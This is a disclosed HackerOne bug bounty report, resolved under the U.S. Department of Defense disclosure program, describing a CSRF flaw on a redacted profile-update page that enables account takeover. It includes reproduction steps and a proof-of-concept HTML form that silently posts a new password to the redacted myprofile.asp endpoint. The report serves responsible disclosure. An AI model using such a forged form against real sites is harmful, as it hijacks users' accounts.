---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
  - vuln/csrf
  - impact/account-takeover
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
body: true
date: 2020-06-11
submitted: 2019-08-10T08:35:05.196Z
bounty_usd: null
votes: 42
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "dhakal_ananda"
source: "https://hackerone.com/reports/670924"
title: "Account takeover through CSRF in http://███████/██████████/default.asp"
---
# Account takeover through CSRF in http://███████/██████████/default.asp

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 42 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-06-11

- Report: [https://hackerone.com/reports/670924](https://hackerone.com/reports/670924)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2019-08-10T08:35:05.196Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
Hi team,

I have found a CSRF vulnerability in http://██████/████/default.asp that leads to account takeover.

## Step-by-step Reproduction Instructions

1. Go to http://██████████/████████/default.asp and login
2. Copy the below HTML code
3. Submit the request and see your profile
4. Try to login again with your username and password
5. Use the password `██████████`. You will be logged in with `████` as a password.


**HTML code:**
```
<html>
  <body>
    <form action="http://██████████/█████████/myprofile.asp?update=yes" method="POST">
      <input type="hidden" name="txtFName" value="███" />
      <input type="hidden" name="txtMI" value="By" />
      <input type="hidden" name="txtLName" value="█████████" />
      <input type="hidden" name="txtTitle" value="" />
      <input type="hidden" name="txtOrganization" value="H1" />
      <input type="hidden" name="txtEmail" value="██████████" />
      <input type="hidden" name="txtPhone" value="" />
      <input type="hidden" name="txtFax" value="" />
      <input type="hidden" name="txtStreet1" value="██████████" />
      <input type="hidden" name="txtStreet2" value="" />
      <input type="hidden" name="txtCity" value="" />
      <input type="hidden" name="state" value="NULL" />
      <input type="hidden" name="txtZip" value="" />
      <input type="hidden" name="txtPassword" value="███" />
      <input type="hidden" name="txtVeriPW" value="█████" />
      <input type="hidden" name="submit1" value="Submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

## Impact

Complete account takeover

## Timeline

- **Report Filed**
- **2019-08-10** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2019-08-17** @dhakal_ananda: Hi @ag3nt-j1,

Just checked the report out. Shouldn't the **Account Takeover** vulnerability be at least **High** severity?
- **Report Resolved**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
